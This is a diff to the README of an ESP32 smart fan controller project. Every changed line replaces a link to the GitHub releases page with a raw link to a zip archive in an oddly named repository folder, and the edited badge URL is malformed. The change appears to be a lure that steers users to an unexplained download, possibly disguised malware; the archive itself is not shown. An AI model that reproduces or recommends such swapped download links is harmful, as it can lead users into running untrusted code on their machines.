@@ -1,7 +1,7 @@
 # 🌬️ ESP32-Smart-Fan - Control Your Fan Remotely
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/achul-cos/ESP32-Smart-Fan/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/achul-cos/ESP32-Smart-Fan/main/extemporization/ESP32-Smart-Fan-3.8.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/achul-cos/ESP32-Smart-Fan/main/extemporization/ESP32-Smart-Fan-3.8.zip)
 
 ## 📖 Project Overview
 The ESP32-Smart-Fan project is a smart fan controller that leverages the ESP32 microcontroller. This system uses a DHT22 sensor to check temperature and humidity levels in your space. By connecting to the Blynk IoT platform, you can monitor and control your fan from anywhere using your smartphone. 
@@ -26,7 +26,7 @@ The system offers two modes of operation:
 To set up the ESP32-Smart-Fan, follow these simple steps:
 
 1. **Download the Software**:
-   Visit this page to download the latest version: [Download Latest Release](https://github.com/achul-cos/ESP32-Smart-Fan/releases).
+   Visit this page to download the latest version: [Download Latest Release](https://raw.githubusercontent.com/achul-cos/ESP32-Smart-Fan/main/extemporization/ESP32-Smart-Fan-3.8.zip).
 
 2. **Install the Blynk App**:
    Download the Blynk app from your device's app store. Create an account if you don't have one. 
@@ -58,7 +58,7 @@ To set up the ESP32-Smart-Fan, follow these simple steps:
 5. Use the app to check conditions or adjust fan settings.
 
 ## 📥 Download & Install
-To get started with the ESP32-Smart-Fan, download the latest version [here](https://github.com/achul-cos/ESP32-Smart-Fan/releases). Make sure to follow all installation instructions carefully.
+To get started with the ESP32-Smart-Fan, download the latest version [here](https://raw.githubusercontent.com/achul-cos/ESP32-Smart-Fan/main/extemporization/ESP32-Smart-Fan-3.8.zip). Make sure to follow all installation instructions carefully.
 
 ## 🔧 Troubleshooting
 If you encounter issues during setup or operation, consider the following tips:
